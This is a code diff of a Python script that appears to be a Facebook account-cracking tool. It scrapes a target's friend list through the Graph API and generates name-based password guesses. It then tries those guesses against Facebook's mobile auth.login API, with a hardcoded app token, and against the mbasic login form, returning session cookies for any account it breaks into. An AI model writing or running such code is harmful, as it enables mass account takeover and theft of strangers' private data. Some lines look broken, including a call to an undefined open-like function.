@@ -368,18 +368,18 @@ def publik():
         print('%s[%s•%s] %sType \'me\' To Get ID From Friendlist'%(K,P,K,P))
         it = input("%s[%s•%s] %sID Target : "%(K,P,K,P))
         try:
-            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
+            pb = requests.get("https://graph.facebook.com/" + it + "?fields=name,id&access_token=" + token)
             ob = json.loads(pb.text)
             print ('%s[%s•%s] %sName : %s'%(K,P,K,P,ob['name']))
         except (KeyError,IOError):
             jalan('\n%s[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
             menu()
-        r = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(it,jid,token))
+        r = requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(it,token))
         id = []
         z = json.loads(r.text)
-        xc = (ob["first_name"]+".json").replace(" ","_")
+        xc = (ob["name"]+".json").replace(" ","_")
         xb = open(xc,"w")
-        for a in z["data"]:
+        for a in z["friends"]["data"]:
             id.append(a["id"]+"•"+a["name"])
             xb.write(a["id"]+"•"+a["name"]+"\n")
         xb.close()
@@ -492,12 +492,12 @@ def pass_dev(_cici_):
         elif len(i)==3 or len(i)==4 or len(i)==5:
             _dapunta_.append(i+"123")
             _dapunta_.append(i+"12345")
-            _dapunta_.append(i+"1234")
+            _dapunta_.append(i+"12346")
         else:
             _dapunta_.append(i)
             _dapunta_.append(i+"123")
             _dapunta_.append(i+"12345")
-            _dapunta_.append(i+"1234")
+            _dapunta_.append(i+"12346")
     if pp in ['',' ','  ']:pass
     else:
         for i in _cici_.split(" "):  
@@ -526,89 +526,40 @@ def tambah_pass_angka():
 def log_api(em,pas,hosts):
     ua = open('ugent.txt','r').read()
     r = requests.Session()
-    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
-        "x-fb-sim-hni": str(random.randint(20000, 40000)),
-        "x-fb-net-hni": str(random.randint(20000, 40000)),
-        "x-fb-connection-quality": "EXCELLENT",
-        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-        "user-agent": ua,
-        "content-type": "application/x-www-form-urlencoded",
-        "x-fb-http-engine": "Liger"}
-    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
-        'format': 'json', 
-        'sdk_version': '2', 
-        'email': em, 
-        'locale': 'ar_AR', 
-        'password': pas, 
-        'sdk': 'ios', 
-        'generate_session_cookies': '1', 
-        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
+    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
+    response = r.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
+    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
+    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
+    else:return {"status":"error","email":em,"pass":pas}
+def log_api_2(em,pas):
+    ua = _dapunta_dapunta_('ugent.txt','r').read()
+    r = requests.Session()
+    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
+    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': em, 'locale': 'en_US', 'password': pas, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
     api = 'https://b-api.facebook.com/method/auth.login'
     response = r.get(api, params=param, headers=header)
-    if 'session_key' in response.text and 'EAAA' in response.text:
-        return {"status":"success","email":em,"pass":pas}
-    elif 'www.facebook.com' in response.json()['error_msg']:
-        return {"status":"cp","email":em,"pass":pas}
+    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
+    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
     else:return {"status":"error","email":em,"pass":pas}
 def log_mbasic(em,pas,hosts):
     ua = open('ugent.txt','r').read()
     r = requests.Session()
     r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
     p = r.get("https://mbasic.facebook.com/")
-    b = bs4.BeautifulSoup(p.text,"html.parser")
-    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
-    data={}
-    for i in b("input"):
-        if i.get("value") is None:
-            if i.get("name")=="email":
-                data.update({"email":em})
-            elif i.get("name")=="pass":
-                data.update({"pass":pas})
-            else:
-                data.update({i.get("name"):""})
-        else:
-            data.update({i.get("name"):i.get("value")})
-    data.update(
-        {"fb_dtsg":meta,"m_sess":"","__user":"0",
-        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
-        }
-    )
-    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
-    if "c_user" in list(r.cookies.get_dict().keys()):
-        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-    elif "checkpoint" in list(r.cookies.get_dict().keys()):
-        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+    b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
+    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
+    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
+    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
     else:return {"status":"error","email":em,"pass":pas}
 def log_free(em,pas,hosts):
     ua = open('ugent.txt','r').read()
     r = requests.Session()
-    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    p = r.get("https://free.facebook.com/")
-    b = bs4.BeautifulSoup(p.text,"html.parser")
-    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
-    data={}
-    for i in b("input"):
-        if i.get("value") is None:
-            if i.get("name")=="email":
-                data.update({"email":em})
-            elif i.get("name")=="pass":
-                data.update({"pass":pas})
-            else:
-                data.update({i.get("name"):""})
-        else:
-            data.update({i.get("name"):i.get("value")})
-    data.update(
-        {"fb_dtsg":meta,"m_sess":"","__user":"0",
-        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
-        }
-    )
-    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-    po = r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
-    if "c_user" in list(r.cookies.get_dict().keys()):
-        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-    elif "checkpoint" in list(r.cookies.get_dict().keys()):
-        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
+    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': em, 'locale': 'en_US', 'password': pas, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
+    api = 'https://b-api.facebook.com/method/auth.login'
+    response = r.get(api, params=param, headers=header)
+    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
+    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
     else:return {"status":"error","email":em,"pass":pas}
 def cek_log(user, pasw, h_cp):
     ua = "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109"
